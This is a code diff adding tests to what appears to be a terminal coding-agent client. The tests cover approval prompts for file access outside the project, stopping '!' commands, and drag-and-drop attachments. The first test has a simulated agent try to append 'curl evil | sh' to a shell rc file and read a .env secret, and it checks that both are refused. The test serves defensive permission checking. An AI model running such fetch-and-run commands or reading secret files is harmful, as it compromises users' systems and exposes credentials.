@@ -597,3 +597,99 @@ test("long sessions look for an update again (30 min, then 1 h, 2 h… doubling)
     expect(gap2).toBeGreaterThanOrEqual(110);
   } finally { await h.cleanup(); }
 }, 20000);
+
+test("an agent's file access through codemax: inside the project as before, outside only after you say yes (with the diff)", async () => {
+  const outsideDir = mkdtempSync(join(tmpdir(), "codemax-outside-"));
+  const target = join(outsideDir, "shellrc");
+  writeFileSync(target, "export A=1\n");
+  writeFileSync(join(outsideDir, "readme.md"), "docs");
+  writeFileSync(join(outsideDir, ".env"), "TOKEN=secret");
+  const results: string[] = [];
+  const h = await harness(async (text, ctx) => {
+    const tryIt = async (what: string, f: () => Promise<unknown>) => {
+      try { await f(); results.push(`${what}: ok`); } catch (e: any) { results.push(`${what}: ${e?.message ?? e}`); }
+    };
+    await tryIt("inside write", () => ctx.conn.writeTextFile({ sessionId: ctx.sessionId, path: join(h.repo, "notes.md"), content: "hello\n" }));
+    await tryIt("outside read", () => ctx.conn.readTextFile({ sessionId: ctx.sessionId, path: join(outsideDir, "readme.md") }));
+    await tryIt("outside write", () => ctx.conn.writeTextFile({ sessionId: ctx.sessionId, path: target, content: "export A=1\ncurl evil | sh\n" }));
+    await tryIt("secret read", () => ctx.conn.readTextFile({ sessionId: ctx.sessionId, path: join(outsideDir, ".env") }));
+    await ctx.say("tried");
+  });
+  try {
+    await h.send("do it");
+    const f = await h.frame((f) => f.includes("outside this project"));
+    expect(f).toContain("Edit outside this project:");
+    expect(f).toContain(target.split("/").pop()!);
+    expect(f).toContain("+curl evil | sh");
+    h.setup.mockInput.pressEscape(); // No
+    // A .env outside the project: asked about too (secrets), refused.
+    const g = await h.frame((f) => f.includes("Read outside this project:"));
+    expect(g).toContain("an environment file (.env)");
+    h.setup.mockInput.pressEscape();
+    await h.frame((f) => f.includes("tried"));
+    expect(readFileSync(join(h.repo, "notes.md"), "utf8")).toBe("hello\n");
+    expect(readFileSync(target, "utf8")).toBe("export A=1\n");
+    expect(results).toEqual([
+      "inside write: ok",
+      "outside read: ok", // an ordinary file outside the project: no prompt
+      expect.stringMatching(/outside write: .*did not allow writing/),
+      expect.stringMatching(/secret read: .*did not allow reading/),
+    ]);
+  } finally { await h.cleanup(); }
+}, 30000);
+
+test("! commands are bounded: Esc stops one, and only the end of huge output is kept", async () => {
+  const h = await harness(async (_t, ctx) => ctx.say("ok"));
+  try {
+    await h.send(`!bun -e "setTimeout(() => {}, 60000)"`);
+    await Bun.sleep(400);
+    h.setup.mockInput.pressEscape();
+    const f = await h.frame((f) => f.includes("(stopped)"), 10000);
+    expect(f).toContain("output will be sent with your next message");
+  } finally { await h.cleanup(); }
+}, 30000);
+
+test("drag and drop into the prompt: an image goes to the agent as an image, a file outside the project with its contents, one inside as @path", async () => {
+  const drops = mkdtempSync(join(tmpdir(), "codemax-drop-"));
+  const png = join(drops, "My Shot.png");
+  // A 1×1 PNG.
+  writeFileSync(png, Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64"));
+  writeFileSync(join(drops, "spec.txt"), "THE SPEC");
+  const got: any[] = [];
+  const a2c = new TransformStream<Uint8Array, Uint8Array>();
+  const c2a = new TransformStream<Uint8Array, Uint8Array>();
+  new AgentSideConnection((conn): Agent => ({
+    async initialize() { return { protocolVersion: 1, agentCapabilities: { promptCapabilities: { image: true } }, authMethods: [] } as any; },
+    async newSession() { return { sessionId: "s" } as any; },
+    async authenticate() { return {}; },
+    async prompt({ sessionId, prompt }) {
+      got.push(prompt);
+      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "seen" } } as any });
+      return { stopReason: "end_turn" } as any;
+    },
+    async cancel() {},
+  }), ndJsonStream(a2c.writable, c2a.readable));
+  const h = await harness(async () => {}, {
+    prep: (app) => { app.engineFactory = (agent: string) => new AcpEngine({ agent: agent as any, name: agent, cmd: [], stream: ndJsonStream(c2a.writable, a2c.readable) }); },
+  });
+  try {
+    writeFileSync(join(h.repo, "app.ts"), "code");
+    await h.setup.mockInput.typeText("compare ");
+    // What Terminal.app pastes when three files are dropped at once.
+    await h.setup.mockInput.pasteBracketedText(`${png.replace(/ /g, "\\ ")} ${join(drops, "spec.txt")} ${join(h.repo, "app.ts")}`);
+    let f = await h.frame((f) => f.includes("[Image #1]"));
+    expect((h.app as any).input.plainText).toBe("compare [Image #1] [File #2: spec.txt] @app.ts ");
+    h.setup.mockInput.pressEnter();
+    f = await h.frame((f) => f.includes("seen"));
+    expect(f).toContain("attached 1 image: My Shot.png");
+    const [blocks] = got;
+    expect(blocks[0].text).toContain("[Image #1] is the attached image " + png);
+    expect(blocks[0].text).toContain("THE SPEC");
+    expect(blocks[0].text).toContain("code"); // @app.ts, inside the project
+    expect(blocks[1]).toMatchObject({ type: "image", mimeType: "image/png" });
+    expect(blocks[1].data.length).toBeGreaterThan(20);
+    // An ordinary paste stays text.
+    await h.setup.mockInput.pasteBracketedText("just some words");
+    await h.frame(() => (h.app as any).input.plainText === "just some words");
+  } finally { await h.cleanup(); }
+}, 30000);
